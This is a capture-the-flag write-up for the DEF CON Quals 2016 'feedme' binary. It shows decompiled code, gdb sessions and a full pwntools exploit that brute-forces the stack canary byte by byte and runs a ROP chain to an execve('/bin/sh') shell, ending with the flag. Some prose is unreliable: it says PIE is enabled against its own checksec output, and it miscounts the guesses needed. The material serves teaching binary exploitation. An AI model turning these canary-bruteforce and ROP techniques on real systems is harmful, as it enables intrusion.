---
search:
  exclude: true
---
# DCQuals 2016 FeedMe

Yet another insane challenge, buckle up !

## Downloading the binary file 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/feed]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/07-bof_static/dcquals16_feedme/feedme
    --2021-03-06 11:21:19--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/07-bof_static/dcquals16_feedme/feedme
    Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/07-bof_static/dcquals16_feedme/feedme [following]
    --2021-03-06 11:21:20--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/07-bof_static/dcquals16_feedme/feedme
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 664792 (649K) [application/octet-stream]
    Saving to: ‘feedme’
    
    feedme                                                          100%[=======================================================================================================================================================>] 649.21K  --.-KB/s    in 0.1s
    
    2021-03-06 11:21:20 (5.42 MB/s) - ‘feedme’ saved [664792/664792]
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/feed]
    → file feedme
    feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/feed]
    → chmod +x feedme
    
    

` ![]()

## Solution 

First let's run the binary to see what it does after using pwn checksec on it:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/feed]
    → pwn checksec feedme
    [*] '/home/nothing/binexp/2/feed/feedme'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/feed]
    → ./feedme
    FEED ME!
    yes
    no
    yes
    no
    yes
    no
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
    ^C
    
    

Here we see that we are dealing with a 32bit statically linked binary, with a non executable stack (NX). When we run it, the program prompts us with some text before we can give some input, it seems to be able to take in a certain amount of input, so let's see how much:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/14 ] [binexp/2/feed]
    → ./feedme
    FEED ME!
    000000000000000000000000000000000
    000000000000000000000000000000000
    ATE 30303030303030303030303030303030...
    *** stack smashing detected ***: ./feedme terminated
    Child exit.
    FEED ME!
    
    

Apparently we are able to overwrite a stack canary, so we probably have a stack buffer overflow somewhere. In addition to that, when it detected that the stack canary was overwritten, it terminated the process and kept asking for more input. The binary is probably designed in such a way that it spawns child processes which is where we scan in the input and overwrite the stack canary. When the program sees tha tthe stack canary got edited, it terminates the child process, and the parent process spawns another instance and continues asking us for input. So let's take a look at the binary inside of ghidra:

![](35.png)

Once again, the main function is not called 'main' so we find it by searching for the text that the binary outputs, (CTRL+SHIFT+E) and we find the following:
    
    
    uint FUN_08049036(void)
    
    {
      byte bVar1;
      undefined4 uVar2;
      uint uVar3;
      int in_GS_OFFSET;
      undefined local_30 [32];
      int local_10;
      
      local_10 = *(int *)(in_GS_OFFSET + 0x14);
      FUN_0804fc60("FEED ME!");
      bVar1 = FUN_08048e42();
      FUN_08048e7e(local_30,bVar1);
      uVar2 = FUN_08048f6e(local_30,bVar1,0x10);
      FUN_0804f700("ATE %s\n",uVar2);
      uVar3 = (uint)bVar1;
      if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
        uVar3 = FUN_0806f5b0();
      }
      return uVar3;
    }
    
    

Here we see that much like our previous challenge, there aren't any scanf nor any gets first off, our input text (most probably **local_32** which can hold 32 bytes) gets passed into the **FUN_08048f6e** function along with the value returned by the **FUN_08048e42()** function and the hex value **0x10**. 

We also see that the function**FUN_08048f6e(local_30,bVar1,0x10);** takes in our input value as well as a limit of 16 (0x10) bytes of input, that function returns a pointer to 16 bytes of our input, so let's look at it from gdb: 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → gdb ./feedme
    GNU gdb (GDB) 10.1
    Copyright (C) 2020 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-pc-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1 using Python engine 3.9
    Reading symbols from ./feedme...
    (No debugging symbols found in ./feedme)
    gef➤  set follow-fork-mode child
    gef➤  show follow-fork mode
    Debugger response to a program call of fork or vfork is "child".
    
    

Now here we basically set gdb so that it follows the forks created by the binary file, now we need breakpoints:

![](40.png)

Now we know where we want our 3 breakpoints:
    
    
    1)	0x8049053
    2)	0x8049069
    3)	0x8049069
    
    

So we continue with gdb:
    
    
    gef➤  set follow-fork-mode child
    gef➤  show follow-fork mode
    Debugger response to a program call of fork or vfork is "child".
    gef➤  b *0x8049053
    Breakpoint 1 at 0x8049053
    gef➤  b *0x8049069
    Breakpoint 2 at 0x8049069
    gef➤  b *0x8049084
    Breakpoint 3 at 0x8049084
    gef➤  r
    Starting program: /home/nothing/binexp/2/feed/feedme
    [Attaching after process 3458879 fork to child process 3458883]
    [New inferior 2 (process 3458883)]
    [Detaching after fork from parent process 3458879]
    [Inferior 1 (process 3458879) detached]
    FEED ME!
    [Switching to process 3458883]
    
    Thread 2.1 "feedme" hit Breakpoint 1, 0x08049053 in ?? ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $eax   : 0x9
    $ebx   : 0x080481a8  →   push ebx
    $ecx   : 0x080eb4d4  →  0x00000000
    $edx   : 0x9
    $esp   : 0xffffd080  →  0x080be70c  →  "FEED ME!"
    $ebp   : 0xffffd0c8  →  0xffffd0f8  →  0xffffd118  →  0x08049970  →   push ebx
    $esi   : 0x0
    $edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
    $eip   : 0x08049053  →  0xfffdeae8  →  0x00000000
    $eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0xffffd080│+0x0000: 0x080be70c  →  "FEED ME!"    ← $esp
    0xffffd084│+0x0004: 0x00000000
    0xffffd088│+0x0008: 0x00000000
    0xffffd08c│+0x000c: 0x0806ccb7  →   sub esp, 0x20
    0xffffd090│+0x0010: 0x080ea200  →  0xfbad2887
    0xffffd094│+0x0014: 0x080ea247  →  0x0eb4d40a
    0xffffd098│+0x0018: 0x080ea248  →  0x080eb4d4  →  0x00000000
    0xffffd09c│+0x001c: 0x00000000
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
        0x8049041                  add    BYTE PTR [ecx-0x3fce0bbb], cl
        0x8049047                  mov    DWORD PTR [esp], 0x80be70c
        0x804904e                  call   0x804fc60
    ●→  0x8049053                  call   0x8048e42
       ↳   0x8048e42                  push   ebp
           0x8048e43                  mov    ebp, esp
           0x8048e45                  sub    esp, 0x28
           0x8048e48                  mov    DWORD PTR [esp+0x8], 0x1
           0x8048e50                  lea    eax, [ebp-0xd]
           0x8048e53                  mov    DWORD PTR [esp+0x4], eax
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
    0x8048e42 (
    )
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "feedme", stopped 0x8049053 in ?? (), reason: BREAKPOINT
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x8049053 → call 0x8048e42
    [#1] 0x80490dc → movzx eax, al
    [#2] 0x80491da → mov eax, 0x0
    [#3] 0x80493ba → mov DWORD PTR [esp], eax
    [#4] 0x8048d2b → hlt
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤
    
    

After a bit of gdb wizardry that i don't even understand, we arrive at this:
    
    
    gef➤  x/4w $esp
    0xffffd080:     0xffffd09c      0x31    0x10    0x806ccb7
    
    gef➤  x/50w 0xffffd09c
    0xffffd09c:     0x77322f78      0x73652420      0xa0a0a70       0xa0a0a0a
    0xffffd0ac:     0xa0a0a0a       0x6e69660a      0xa687369       0x300a300a
    0xffffd0bc:     0x30303030      0x30303030      0x30303030      0x30303030
    0xffffd0cc:     0x8049030       0x80ea0a0       0x0     0x80ed840
    0xffffd0dc:     0x804f8b4       0x0     0x0     0x0
    0xffffd0ec:     0x80481a8       0x80481a8       0x0     0xffffd118
    0xffffd0fc:     0x80491da       0x80ea0a0       0x0     0x2
    0xffffd10c:     0x0     0x0     0x80ea00c       0x8049970
    0xffffd11c:     0x80493ba       0x1     0xffffd1a4      0xffffd1ac
    0xffffd12c:     0x0     0x0     0x80481a8       0x0
    0xffffd13c:     0x80ea00c       0x8049970       0x488454cd      0xbe00e522
    0xffffd14c:     0x0     0x0     0x0     0x0
    0xffffd15c:     0x0     0x0
    
    gef➤  info frame
    Stack level 0, frame at 0xffffd0d0:
     eip = 0x8049084; saved eip = 0x8049030
     called by frame at 0x30303038
     Arglist at 0xffffd0c8, args:
     Locals at 0xffffd0c8, Previous frame's sp is 0xffffd0d0
     Saved registers:
      ebp at 0xffffd0c8, eip at 0xffffd0cc
    
    

The start of our input is being scanned at **0xffffd09c** and the return address is at **0xffffd0cc** , Somehow you have to find that the stack canary is some random hex value, at some memory address because it's 4 bytes of random values with the last value being a nullbyte. and that there is a 0x20 byte offset to the stack canary and : 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/1 ] [binexp/2/feed]
    → python3
    Python 3.9.2 (default, Feb 20 2021, 18:40:11)
    [GCC 10.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    
    >>> hex( 0xffffd0cc   -   0xffffd09c    )
    '0x30'
    
    

Now we know that there is a 0x30 bytes offset to the return address. Both the 0x30 and the 0x20 offset are within the reach of our buffer overflow Lastly we need to know where the feed function is called: 
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → gdb ./feedme
    GNU gdb (GDB) 10.1
    Copyright (C) 2020 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-pc-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1 using Python engine 3.9
    Reading symbols from ./feedme...
    (No debugging symbols found in ./feedme)
    gef➤  b *0x8049053
    Breakpoint 1 at 0x8049053
    gef➤  r
    Starting program: /home/nothing/binexp/2/feed/feedme
    [Detaching after fork from child process 3730383]
    FEED ME!
    ^C
    Program received signal SIGINT, Interrupt.
    0xf7ffc549 in __kernel_vsyscall ()
    ~/.gef-54e93efd89ec59e5d178fbbeda1fed890098d18d.py:2425: DeprecationWarning: invalid escape sequence '\$'
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $eax   : 0xfffffe00
    $ebx   : 0x38ebcf
    $ecx   : 0xffffd0e0  →  0x00000000
    $edx   : 0x0
    $esp   : 0xffffd0b8  →  0xffffd0f8  →  0xffffd118  →  0x08049970  →   push ebx
    $ebp   : 0xffffd0f8  →  0xffffd118  →  0x08049970  →   push ebx
    $esi   : 0x0
    $edi   : 0x080ea00c  →  0x08067f90  →   mov edx, DWORD PTR [esp+0x4]
    $eip   : 0xf7ffc549  →  <__kernel_vsyscall+9> pop ebp
    $eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0xffffd0b8│+0x0000: 0xffffd0f8  →  0xffffd118  →  0x08049970  →   push ebx       ← $esp
    0xffffd0bc│+0x0004: 0x00000000
    0xffffd0c0│+0x0008: 0xffffd0e0  →  0x00000000
    0xffffd0c4│+0x000c: 0x0806cc02  →   pop ebx
    0xffffd0c8│+0x0010: 0x080481a8  →   push ebx
    0xffffd0cc│+0x0014: 0x0804910e  →   mov DWORD PTR [ebp-0xc], eax
    0xffffd0d0│+0x0018: 0x0038ebcf
    0xffffd0d4│+0x001c: 0xffffd0e0  →  0x00000000
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
       0xf7ffc543 <__kernel_vsyscall+3> mov    ebp, esp
       0xf7ffc545 <__kernel_vsyscall+5> sysenter
       0xf7ffc547 <__kernel_vsyscall+7> int    0x80
     → 0xf7ffc549 <__kernel_vsyscall+9> pop    ebp
       0xf7ffc54a <__kernel_vsyscall+10> pop    edx
       0xf7ffc54b <__kernel_vsyscall+11> pop    ecx
       0xf7ffc54c <__kernel_vsyscall+12> ret
       0xf7ffc54d                  nop
       0xf7ffc54e                  nop
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "feedme", stopped 0xf7ffc549 in __kernel_vsyscall (), reason: SIGINT
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0xf7ffc549 → __kernel_vsyscall()
    [#1] 0x806cc02 → pop ebx
    [#2] 0x804910e → mov DWORD PTR [ebp-0xc], eax
    [#3] 0x80491da → mov eax, 0x0
    [#4] 0x80493ba → mov DWORD PTR [esp], eax
    [#5] 0x8048d2b → hlt
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤  bt
    #0  0xf7ffc549 in __kernel_vsyscall ()
    #1  0x0806cc02 in ?? ()
    #2  0x0804910e in ?? ()
    #3  0x080491da in ?? ()
    #4  0x080493ba in ?? ()
    #5  0x08048d2b in ?? ()
    
    

So here we basically set only the first breakpoint, and hit CTRL+C to exit out of the 'feedme' prompt and then run 'bt' so that we can follow the backtrace to the parent function that we can also find if we look for (CTRL+SHIFT+E) **'Child IO error!'** : 

![](41.png)

So we get the following code:
    
    
    void FUN_080490b0(void)
    
    {
      undefined uVar1;
      int local_1c;
      uint local_18;
      int local_14;
      int local_10;
      
      local_1c = 0;
      local_18 = 0;
      while( true ) {
        if (799 < local_18) {
          return;
        }
        local_14 = FUN_0806cc70();
        if (local_14 == 0) break;
        local_10 = FUN_0806cbe0(local_14,&local;_1c,0);
        if (local_10 == -1) {
          FUN_0804fc60("Wait error!");
          FUN_0804ed20(0xffffffff);
        }
        if (local_1c == -1) {
          FUN_0804fc60("Child IO error!");
          FUN_0804ed20(0xffffffff);
        }
        FUN_0804fc60("Child exit.");
        FUN_0804fa20(0);
        local_18 = local_18 + 1;
      }
      uVar1 = FUN_08049036();
      FUN_0804f700("YUM, got %d bytes!\n",uVar1);
      return;
    }
    

Here we see that it is calling the function responsible for setting up a child process in a loop that will run for 800 times, that means we can crash a child process 800 times before the program exits on us, So how do we exploit it?

So first, with the stack canary, we have the ability to overwrite the return address. The only thing stopping us other than the NX is the stack canary that we can bruteforce. The problem is that all of the child process will share the same canary. For the canary it will have 4 bytes, one null byte and 3 random bytes, so only 3 bytes that we do not know.

So we can overwrite the stack canary one byte a a time, The byte we overwrite it with will be a wild guess, if one child process dies we know that it was incorrect, and if it doesn't then we will know what our guess was correct. There are 256 different values that the byte can be, and since there are 3 bytes we are guessing that gives us a 256 * 3 = 768 possible guesses every combination if we guess one byte a a time. This can be done by only overwriting one byte at a time. with that we can deal with the stack canary.

Now onto the ROP chain: Once we have the stack canary and nothing will be able to stop us from reaching the return function to get code execution as usual. Then what do we execute ? NX is turned on, so we cannot just jump to the shellcode we place on the stack. However the elf does have PIE set to enabled which randomizes the address of code, Therefore building a ROP chain without an infoleak is possible. For this ROP Chain, we will be making an execve() syscall to /bin/sh to give us a shell.

Now to build our ROP chain we need to look for ROP Gadgets as we saw in the previous 2 challenges. We will use ROPGadget for that, check out [simplecalc](calc.md) to check out how i installed it. now let's find the following gadgets:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → ROPgadget --binary feedme| grep "mov.*\[eax\].*; ret$"
    
    [...]
    
    0x0807be31 : mov dword ptr [eax], edx ; ret
    
    [...]
    
    

Here's an useful gadget because this will allow us to move the contents of the edx register into the area of space pointed to by the address of eax, and then return. So if we wanted to write to the address 1234 wec ould load that address into eax and the value we wanted to write into the edx register, then call this gadget.
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → ROPgadget --binary feedme| grep ": pop eax ; ret$"
    0x080bb496 : pop eax ; ret
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → ROPgadget --binary feedme| grep ": pop edx ; ret$"
    0x0806f34a : pop edx ; ret
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → ROPgadget --binary feedme| grep ": pop ecx ; pop ebx ; ret$"
    0x0806f371 : pop ecx ; pop ebx ; ret
    
    

The last gadget we found is so that we can control the value of the ecx register. Unfortunately there are no gadgets that will just pop a value into the ecx and just return, so this is the next best thing, which will save us not having to use another gadget when we pop a value into the ebx register. 

Now that we have gadgets for eax, edx, ecx:

![](42.png)

Now we need a gadget for the ebx register because this one will be needed to contain our **/bin/sh** string
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → ROPgadget --binary feedme| grep "int 0x80$"
    0x080941d3 : add bh, al ; inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80
    0x0804975f : add byte ptr [eax], al ; int 0x80
    0x0806ceb0 : add byte ptr [eax], al ; mov eax, edi ; mov ecx, 0x81 ; int 0x80
    0x0806ceb1 : add byte ptr [ecx + 0x81b9f8], cl ; add byte ptr [eax], al ; int 0x80
    0x0806cf3c : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80
    0x0806f428 : clc ; mov ecx, 0x80 ; int 0x80
    0x0806ceb3 : clc ; mov ecx, 0x81 ; int 0x80
    0x080941d5 : inc ebp ; test byte ptr [ecx], dl ; add byte ptr [eax], al ; int 0x80
    
    **0x08049761 : int 0x80**
    
    

Here we see that at **0x08049761** is a gadget that enables us to make a syscall to the kernel to get a shell. in x86, you can just call int 0x80. Syscall will expect 3 arguments as detailed below: 
    
    
    eax :	11			# SYSCALL ID
    ebx :	bss addr 0x80eb928	# address of the command
    ecx :	0x0
    edx :	0x0
    

So now with this we get our ROP Chain:
    
    
    # This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
    payload += p32(0x080bb496)    # pop eax ; ret
    payload += p32(0x80eb928)    # bss address
    payload += p32(0x0806f34a)    # pop edx
    payload    += p32(0x6e69622f)    # /bin string in hex, in little endian
    payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
    
    # Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
    payload += p32(0x080bb496)    # pop eax ; ret
    payload += p32(0x80eb928 + 0x4)    # bss address + 0x4 to write after '/bin'
    payload += p32(0x0806f34a)    # pop edx
    payload    += p32(0x0068732f)    # /sh string in hex, in little endian
    payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
    
    # Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
    payload += p32(0x080bb496)    # pop eax ; ret
    payload += p32(0xb)            # 11
    payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
    payload += p32(0x0)            # 0x0
    payload += p32(0x80eb928)    # bss address
    payload += p32(0x0806f34a)    # pop edx ; ret
    payload += p32(0x0)            # 0x0
    payload += p32(0x8049761)    # syscall
    
    

And we get our full exploit here:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → vim exploit.py
    
    
    
    
    # This is based off of a Raytheon SI Govs talk
    
    # First we import pwntools
    from pwn import *
    
    # Here is the function to brute force the canary
    def breakCanary():
        # We know that the first byte of the stack canary has to be \x00 since it is null terminated, keep the values we know for the canary in known_canary
        known_canary = "\x00"
        # Ascii representation of the canary
        hex_canary = "00"
        # The current canary which will be incremented
        canary = 0x0
        # The number of bytes we will give as input
        inp_bytes = 0x22
        # Iterate 3 times for the three bytes we need to brute force
        for j in range(0, 3):
            # Iterate up to 0xff times to brute force all posible values for byte
            for i in xrange(0xff):
                log.info("Trying canary: " + hex(canary) + hex_canary)
                
                # Send the current input size
                target.send(p32(inp_bytes)[0])
    
                # Send this iterations canary
                target.send("0"*0x20 + known_canary + p32(canary)[0])
    
                # Scan in the output, determine if we have a correct value
                output = target.recvuntil("exit.")
                if "YUM" in output:
                    # If we have a correct value, record the canary value, reset the canary value, and move on
                    print "next byte is: " + hex(canary)
                    known_canary = known_canary + p32(canary)[0]
                    inp_bytes = inp_bytes + 1
                    new_canary = hex(canary)
                    new_canary = new_canary.replace("0x", "")
                    hex_canary = new_canary + hex_canary
                    canary = 0x0
                    break
                else:
                    # If this isn't the canary value, increment canary by one and move onto next loop
                    canary = canary + 0x1
    
        # Return the canary
        return int(hex_canary, 16)
    
    # Start the target process
    target = process('./feedme')
    #gdb.attach(target)
    
    # Brute force the canary
    canary = breakCanary()
    log.info("The canary is: " + hex(canary))
    
    
    # Now that we have the canary, we can start making our final payload
    
    # This will cover the space up to, and including the canary
    payload = "0"*0x20 + p32(canary)
    
    # This will cover the rest of the space between the canary and the return address
    payload += "1"*0xc
    
    # Start putting together the ROP Chain
    
    # This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
    payload += p32(0x080bb496)    # pop eax ; ret
    payload += p32(0x80eb928)    # bss address
    payload += p32(0x0806f34a)    # pop edx
    payload    += p32(0x6e69622f)    # /bin string in hex, in little endian
    payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
    
    # Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
    payload += p32(0x080bb496)    # pop eax ; ret
    payload += p32(0x80eb928 + 0x4)    # bss address + 0x4 to write after '/bin'
    payload += p32(0x0806f34a)    # pop edx
    payload    += p32(0x0068732f)    # /sh string in hex, in little endian
    payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
    
    # Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
    payload += p32(0x080bb496)    # pop eax ; ret
    payload += p32(0xb)            # 11
    payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
    payload += p32(0x0)            # 0x0
    payload += p32(0x80eb928)    # bss address
    payload += p32(0x0806f34a)    # pop edx ; ret
    payload += p32(0x0)            # 0x0
    payload += p32(0x8049761)    # syscall
    
    # Send the amount of bytes for our payload, and the payload itself
    target.send("\x78")
    target.send(payload)
    
    # Drop to an interactive shell
    target.interactive()
    
    

Now let's see if it works:
    
    
    [ 192.168.0.18/24 ] [ /dev/pts/2 ] [binexp/2/feed]
    → python2 exploit.py
    [+] Starting local process './feedme': pid 208854
    [*] Trying canary: 0x000
    [*] Trying canary: 0x100
    [*] Trying canary: 0x200
    [*] Trying canary: 0x300
    [*] Trying canary: 0x400
    [*] Trying canary: 0x500
    [*] Trying canary: 0x600
    [*] Trying canary: 0x700
    [*] Trying canary: 0x800
    [*] Trying canary: 0x900
    [*] Trying canary: 0xa00
    [*] Trying canary: 0xb00
    [*] Trying canary: 0xc00
    [*] Trying canary: 0xd00
    [*] Trying canary: 0xe00
    [*] Trying canary: 0xf00
    
    [...]
    
    [*] Trying canary: 0x7d5cc000
    [*] Trying canary: 0x7e5cc000
    [*] Trying canary: 0x7f5cc000
    [*] Trying canary: 0x805cc000
    [*] Trying canary: 0x815cc000
    [*] Trying canary: 0x825cc000
    [*] Trying canary: 0x835cc000
    [*] Trying canary: 0x845cc000
    [*] Trying canary: 0x855cc000
    [*] Trying canary: 0x865cc000
    [*] Trying canary: 0x875cc000
    [*] Trying canary: 0x885cc000
    [*] Trying canary: 0x895cc000
    [*] Trying canary: 0x8a5cc000
    [*] Trying canary: 0x8b5cc000
    [*] Trying canary: 0x8c5cc000
    [*] Trying canary: 0x8d5cc000
    next byte is: 0x8d
    [*] The canary is: 0x8d5cc000
    [*] Switching to interactive mode
    
    FEED ME!
    ATE 30303030303030303030303030303030...
    $ id
    uid=1000(nothing) gid=1000(nothing) groups=1000(nothing),90(network),98(power),972(libvirt),988(storage),990(optical),995(audio),998(wheel)
    $ cat flag.txt
    flag{g0ttem_b0yz}
    $ exit
    
    

And that's it ! We have been able to spawn a shell and print the flag.

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

